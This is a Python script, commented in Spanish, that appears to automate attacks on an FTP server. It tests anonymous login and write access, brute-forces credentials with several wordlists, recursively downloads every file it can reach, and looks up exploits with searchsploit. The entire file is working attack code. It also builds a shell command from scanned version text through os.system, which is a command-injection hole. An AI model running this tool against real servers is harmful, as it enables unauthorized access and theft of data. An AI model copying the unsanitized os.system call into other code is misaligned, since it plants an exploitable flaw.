import ftplib
import os
import shutil
import sys
import io
import json

def ftp_grep_searchsploit(target_ip):
    print("[*] Buscando CVEs en el resultado de searchsploit...")
    searchsploit_file = f"logs/{target_ip}/ftp/searchsploit.txt"
    try:
        with open(searchsploit_file, "r") as f:
            data = json.load(f)
    except Exception as e:
        print(f"[!] Error al leer el archivo {searchsploit_file}: {e}")
        return

    cves = []
    # Si result_exploit contiene algo, no hace falta la palabra cve
    for result in data.get("RESULTS_EXPLOIT", []):
        cve = result["Title"]
        cves.append(cve)

    if cves:
        print(f"[+] CVEs encontrados: {', '.join(cves)}")
        report_path = f"logs/{target_ip}/reporte/ftp_cves.txt"
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        with open(report_path, "w") as rep:
            rep.write(f"----CVEs genéricos de la versión de FTP instalada----")
            for cve in cves:
                rep.write(f"\n{cve}")
    else:
        print("[-] No se encontraron CVEs en el resultado de searchsploit.")

def ftp_searchsploit(target_ip):
    print("[*] Obteniendo la versión de FTP desde el resultado de Nmap...")
    nmap_file = f"logs/{target_ip}/nmap/ports_services_versions.txt"
    try:
        with open(nmap_file, "r") as f:
            lines = f.readlines()
    except Exception as e:
        print(f"[!] Error al leer el archivo {nmap_file}: {e}")
        return

    ftp_version = None
    for line in lines:
        # Se omite la línea de encabezado y líneas vacías
        if line.startswith("PORT") or line.strip() == "":
            continue
        parts = line.split()
        if len(parts) >= 4 and parts[2].lower() == "ftp":
            # Se asume que la versión puede estar compuesta de más de una palabra
            ftp_version = " ".join(parts[3:])
            break

    if ftp_version is None:
        print("[-] No se encontró información de versión para FTP en el archivo de Nmap.")
        return

    print(f"[+] Versión de FTP encontrada: {ftp_version}")

    # Se asegura que exista el directorio de logs para FTP
    ftp_dir = f"logs/{target_ip}/ftp"
    os.makedirs(ftp_dir, exist_ok=True)
    searchsploit_file = f"{ftp_dir}/searchsploit.txt"

    # Se construye y ejecuta el comando searchsploit
    cmd = f'searchsploit "{ftp_version}" -j > {searchsploit_file}'
    print(f"[*] Ejecutando comando: {cmd}")
    try:
        os.system(cmd)
        print(f"[+] Resultado de searchsploit guardado en {searchsploit_file}")
        ftp_grep_searchsploit(target_ip)
    except Exception as e:
        print(f"[!] Error al ejecutar searchsploit: {e}")

def check_ftp_write_permission(ftp, target_ip):
    print("[*] Comprobando permisos de escritura en el FTP...")
    test_filename = "test_write_permission.txt"
    test_content = b"prueba de permisos de escritura"
    try:
        ftp.storbinary(f"STOR {test_filename}", io.BytesIO(test_content))
        ftp.delete(test_filename)
        print("[+] Permiso de escritura habilitado en el FTP.")
        report_path = f"logs/{target_ip}/ftp/escritura_perm.txt"
        os.makedirs(os.path.dirname(report_path), exist_ok=True)
        with open(report_path, "w") as rep:
            rep.write("El servidor FTP permite escritura, lo que podría permitir la subida de archivos maliciosos.")
        shutil.copy(report_path, f"logs/{target_ip}/reporte/ftp_escritura_perm.txt")
    except ftplib.error_perm:
        print("[-] No se detectaron permisos de escritura.")

def check_ftp_anonymous(target_ip):
    anonymous_file = f"logs/{target_ip}/ftp/anonymous.txt"
    print(f"[*] Verificando acceso FTP anónimo en {target_ip}...")
    try:
        ftp = ftplib.FTP(target_ip)
        ftp.login("anonymous", "anonymous")
        print("[+] ¡Anonymous login habilitado!")

        check_ftp_write_permission(ftp, target_ip)

        os.makedirs(f"logs/{target_ip}/ftp", exist_ok=True)

        with open(anonymous_file, 'w') as f:
            f.write(f"Habilitado FTP anonymous login")

        shutil.copy(anonymous_file, f"logs/{target_ip}/reporte/ftp_anonymous.txt")
        # Procedemos a descargar archivos si el acceso es exitoso
        dump_ftp_contents(ftp, target_ip)
        ftp.quit()
    except ftplib.error_perm:
        print("[-] El acceso anónimo está deshabilitado.")
        # Iniciamos la casuística del mini-bruteforce con usuario 'admin'
        mini_bruteforce(target_ip)
    except Exception as e:
        print(f"[!] Error al conectar con FTP: {e}")

def mini_bruteforce(target_ip):
    print("[*] Iniciando mini bruteforce...")
    encontrado = False
    wordlist_path = "wordlists/misc/mini_bruteforcing_passwords.txt"
    try:
        with open(wordlist_path, 'r') as wl:
            passwords = [line.strip() for line in wl if line.strip()]
    except Exception as e:
        print(f"[!] Error al leer el wordlist mini bruteforce: {e}")
        return

    for pwd in passwords:
        try:
            ftp = ftplib.FTP(target_ip, timeout=5)
            ftp.login("admin", pwd)
            print(f"[+] Credenciales válidas encontradas: admin:{pwd}")

            check_ftp_write_permission(ftp, target_ip)

            # Log de credenciales débiles
            log_path = f"logs/{target_ip}/ftp/credentials_found.txt"
            os.makedirs(os.path.dirname(log_path), exist_ok=True)
            with open(log_path, "w") as logf:
                logf.write(f"Credenciales FTP débiles encontradas: admin:{pwd} (obtenidas por fuerza bruta)")

            shutil.copy(log_path, f"logs/{target_ip}/reporte/ftp_credentials_found.txt")
            dump_ftp_contents(ftp, target_ip)
            ftp.quit()
            encontrado = True
            break
        except ftplib.error_perm:
            # Credenciales incorrectas; continuar con el siguiente intento
            pass
        except Exception as e:
            print(f"[!] Error al probar admin:{pwd} - {e}")

    # Tras el mini-bruteforce, probamos admin:admin para ver si estamos bloqueados
    print("[*] Verificando limitación de intentos...")
    limite_libre = False
    try:
        ftp = ftplib.FTP(target_ip, timeout=5)
        ftp.login("admin", "admin")
        # Si llega aquí, significa que se ha procesado el intento, aunque las credenciales sean inválidas,
        # lo que indica que el servidor sigue respondiendo normalmente.
    except ftplib.error_perm as e:
        error_msg = str(e)
        # Si el error contiene "530" (usualmente "login incorrect"), se asume que no hay bloqueo
        if "530" in error_msg:
            print("[+] No se detecta limite de intentos.")
            log_path = f"logs/{target_ip}/ftp/no_limite_intentos.txt"
            os.makedirs(os.path.dirname(log_path), exist_ok=True)
            with open(log_path, "w") as logf:
                logf.write("No hay límite de intentos en el login FTP.")
            shutil.copy(log_path, f"logs/{target_ip}/reporte/ftp_no_limite_intentos.txt")
            limite_libre = True
        else:
            print("[-] Error al probar admin:admin: ", error_msg)
    except Exception as e:
        print(f"[!] Error al probar admin:admin - {e}")

    # Si no se han encontrado credenciales en el mini-bruteforce y no estamos bloqueados,
    # se inicia el bruteforce elaborado.
    if limite_libre and not encontrado:
        ftp_elaborate_bruteforce(target_ip)
    elif not limite_libre:
        print("[*] No se realizará el brute force elaborado debido a posible limitación de intentos.")


def ftp_elaborate_bruteforce(target_ip):
    print("[*] Iniciando brute force elaborado...")
    custom_dir = f"wordlists/{target_ip}"
    # Variables para wordlists personalizadas
    users_custom = []
    pwds_custom = []

    # Si existe un directorio personalizado, se intenta cargar las listas
    if os.path.isdir(custom_dir):
        user_file = os.path.join(custom_dir, "users.txt")
        pwd_file = os.path.join(custom_dir, "passwords.txt")
        if os.path.isfile(user_file):
            try:
                with open(user_file, 'r') as uf:
                    users_custom = [line.strip() for line in uf if line.strip()]
                print(f"[*] Se cargaron {len(users_custom)} usuarios desde {user_file}")
            except Exception as e:
                print(f"[!] Error al leer {user_file}: {e}")
        if os.path.isfile(pwd_file):
            try:
                with open(pwd_file, 'r') as pf:
                    pwds_custom = [line.strip() for line in pf if line.strip()]
                print(f"[*] Se cargaron {len(pwds_custom)} contraseñas desde {pwd_file}")
            except Exception as e:
                print(f"[!] Error al leer {pwd_file}: {e}")

    # Si se cargó al menos un listado personalizado, se intenta el brute force con ellos
    if users_custom or pwds_custom:
        print("[*] Intentando combinaciones personalizadas...")
        # Caso 1: Se tienen tanto usuarios como contraseñas
        if users_custom and pwds_custom:
            for user in users_custom:
                for pwd in pwds_custom:
                    try:
                        ftp = ftplib.FTP(target_ip, timeout=5)
                        ftp.login(user, pwd)
                        print(f"[+] Credenciales válidas encontradas: {user}:{pwd}")

                        check_ftp_write_permission(ftp, target_ip)

                        log_path = f"logs/{target_ip}/ftp/credentials_found.txt"
                        os.makedirs(os.path.dirname(log_path), exist_ok=True)
                        with open(log_path, "w") as logf:
                            logf.write(
                                f"Credenciales FTP débiles encontradas: {user}:{pwd} (obtenidas por fuerza bruta)")
                        shutil.copy(log_path, f"logs/{target_ip}/reporte/ftp_credentials_found.txt")
                        dump_ftp_contents(ftp, target_ip)
                        ftp.quit()
                        return
                    except ftplib.error_perm:
                        pass
                    except Exception as e:
                        print(f"[!] Error al probar {user}:{pwd} - {e}")
        # Caso 2: Se tienen usuarios personalizados pero no contraseñas
        elif users_custom and not pwds_custom:
            default_pw_path = "wordlists/misc/ftp-passwords.txt"
            try:
                with open(default_pw_path, 'r') as dpf:
                    pwds_custom = [line.strip() for line in dpf if line.strip()]
                print(
                    f"[*] Se cargaron {len(pwds_custom)} contraseñas desde {default_pw_path} para combinar con usuarios personalizados")
            except Exception as e:
                print(f"[!] Error al leer {default_pw_path}: {e}")
            for user in users_custom:
                for pwd in pwds_custom:
                    try:
                        ftp = ftplib.FTP(target_ip, timeout=5)
                        ftp.login(user, pwd)
                        print(f"[+] Credenciales válidas encontradas: {user}:{pwd}")

                        check_ftp_write_permission(ftp, target_ip)

                        log_path = f"logs/{target_ip}/ftp/credentials_found.txt"
                        os.makedirs(os.path.dirname(log_path), exist_ok=True)
                        with open(log_path, "w") as logf:
                            logf.write(
                                f"Credenciales FTP débiles encontradas: {user}:{pwd} (obtenidas por fuerza bruta)")
                        shutil.copy(log_path, f"logs/{target_ip}/reporte/ftp_credentials_found.txt")
                        dump_ftp_contents(ftp, target_ip)
                        ftp.quit()
                        return
                    except ftplib.error_perm:
                        pass
                    except Exception as e:
                        print(f"[!] Error al probar {user}:{pwd} - {e}")
        print("[-] No se encontraron credenciales válidas usando listas personalizadas.")

        # Intentar usar cada usuario como contraseña (user:user)
        if users_custom:
            print("[*] Intentando usar cada usuario como contraseña (user:user)...")
            for user in users_custom:
                try:
                    ftp = ftplib.FTP(target_ip, timeout=5)
                    ftp.login(user, user)
                    print(f"[+] Credenciales válidas encontradas: {user}:{user}")

                    check_ftp_write_permission(ftp, target_ip)

                    log_path = f"logs/{target_ip}/ftp/credentials_found.txt"
                    os.makedirs(os.path.dirname(log_path), exist_ok=True)
                    with open(log_path, "w") as logf:
                        logf.write(f"Credenciales FTP débiles encontradas: {user}:{user} (obtenidas por fuerza bruta)")
                    shutil.copy(log_path, f"logs/{target_ip}/reporte/ftp_credentials_found.txt")
                    dump_ftp_contents(ftp, target_ip)
                    ftp.quit()
                    return
                except ftplib.error_perm:
                    pass
                except Exception as e:
                    print(f"[!] Error al probar {user}:{user} - {e}")

    # Si no se obtuvieron resultados con las personalizadas (o no existen), se intenta la lista predeterminada
    print("[*] Intentando con la lista predeterminada de FTP...")
    default_users_path = "wordlists/misc/ftp-top_default_passlist.txt"
    try:
        with open(default_users_path, 'r') as df:
            combos = [line.strip() for line in df if line.strip()]
        print(f"[*] Se cargaron {len(combos)} combos desde {default_users_path}")
        for combo in combos:
            try:
                user, pwd = combo.split(":", 1)
                ftp = ftplib.FTP(target_ip, timeout=5)
                ftp.login(user, pwd)
                print(f"[+] Credenciales válidas encontradas: {user}:{pwd}")

                check_ftp_write_permission(ftp, target_ip)

                log_path = f"logs/{target_ip}/ftp/credentials_found.txt"
                os.makedirs(os.path.dirname(log_path), exist_ok=True)
                with open(log_path, "w") as logf:
                    logf.write(f"Credenciales FTP débiles encontradas: {user}:{pwd} (obtenidas por fuerza bruta)")
                shutil.copy(log_path, f"logs/{target_ip}/reporte/ftp_credentials_found.txt")
                dump_ftp_contents(ftp, target_ip)
                ftp.quit()
                return
            except ftplib.error_perm:
                pass
            except Exception as e:
                print(f"[!] Error al probar {combo} - {e}")
    except Exception as e:
        print(f"[!] Error al leer la lista por defecto {default_users_path}: {e}")

    print("[-] Bruteforce elaborado finalizado sin encontrar credenciales válidas.")


def dump_ftp_contents(ftp, target_ip, remote_path="/", local_path=None):
    if local_path is None:
        local_path = f"logs/{target_ip}/ftp/dump/"

    os.makedirs(local_path, exist_ok=True)

    try:
        ftp.cwd(remote_path)
        # Lista completa de archivos y carpetas, incluyendo ocultos
        file_list = []
        ftp.retrlines("LIST -a", file_list.append)

        for line in file_list:
            parts = line.split()
            name = " ".join(parts[8:])  # El nombre del archivo puede contener espacios
            file_type = parts[0][0]     # Primer carácter indica tipo (d=directorio, -=archivo)

            if name in [".", ".."]:
                continue  # Omitir enlaces a directorios padre/actual

            remote_item_path = f"{remote_path}/{name}".replace("//", "/")  # Asegurar formato correcto

            if file_type == "d":  # Si es un directorio
                new_local_path = os.path.join(local_path, name)
                os.makedirs(new_local_path, exist_ok=True)
                dump_ftp_contents(ftp, target_ip, remote_item_path, new_local_path)
            else:  # Si es un archivo, lo descargamos
                local_file = os.path.join(local_path, name)
                try:
                    with open(local_file, "wb") as f:
                        ftp.retrbinary(f"RETR {remote_item_path}", f.write)
                    print(f"[+] Archivo descargado: {local_file}")
                except Exception as e:
                    print(f"[!] Error al descargar {name}: {e}")

    except Exception as e:
        print(f"[!] Error al listar archivos en {remote_path}: {e}")

# Main de prueba
if __name__ == "__main__":
    target = sys.argv[1]
    check_ftp_anonymous(target)
    ftp_searchsploit(target)
